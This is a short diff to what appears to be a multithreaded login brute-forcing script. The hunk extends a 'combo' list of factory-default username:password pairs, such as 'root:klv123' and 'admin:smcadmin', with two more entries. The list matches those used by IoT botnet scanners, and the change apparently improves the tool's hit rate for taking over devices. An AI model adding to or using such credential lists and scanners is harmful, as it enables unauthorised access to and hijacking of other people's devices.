@@ -19,7 +19,7 @@ combo = [
     "admin:admin1234", "root:1111", "admin:smcadmin", "admin:1111", "root:666666", "root:password",
     "root:1234", "root:klv123", "Administrator:admin", "service:service", "supervisor:supervisor",
     "guest:guest", "guest:12345", "admin1:password", "administrator:1234", "666666:666666",
-    "888888:888888", "tech:tech", "mother:fucker"
+    "888888:888888", "tech:tech", "mother:fucker", "root:admin", "admin:root"
 ]
 
 threads = int(sys.argv[1])
